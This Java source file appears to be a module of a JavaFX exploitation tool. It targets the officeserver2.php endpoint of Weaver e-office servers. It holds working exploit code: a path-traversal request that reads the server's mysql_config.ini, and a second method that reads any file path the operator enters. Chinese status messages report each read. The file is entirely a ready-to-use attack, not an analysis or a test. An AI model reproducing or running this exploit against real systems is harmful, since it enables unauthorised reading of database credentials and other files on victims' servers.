package exp.oa.weaveroa.eoffice;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class weaver_eo_Officeserver2_FileRead implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea,textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd, textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 不支持getshell功能");
        });
        return false;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {

        try {
            Response get_res = HttpTools.get(url + "/iweboffice/officeserver2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../bin/mysql_config.ini", new HashMap<>(), "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("VERSION")) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ weaver_eo_Officeserver2_FileRead ]");
                    textArea.appendText("\n 成功读取mysql_config.ini文件");
                    textArea.appendText("\n 输入文件名进行读取");
                    textArea.appendText("\n");
                    textArea_cmd.appendText("\n"+get_res.getText());
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {

        try {
            Response get_res = HttpTools.get(url + "/iweboffice/officeserver2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE="+cmd, new HashMap<>(), "utf-8");

            if (get_res.getCode() == 200 && get_res.getText().contains("VERSION")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 读取成功！");
                    textArea_cmd.appendText("\n"+get_res.getText());
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 读取失败！");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
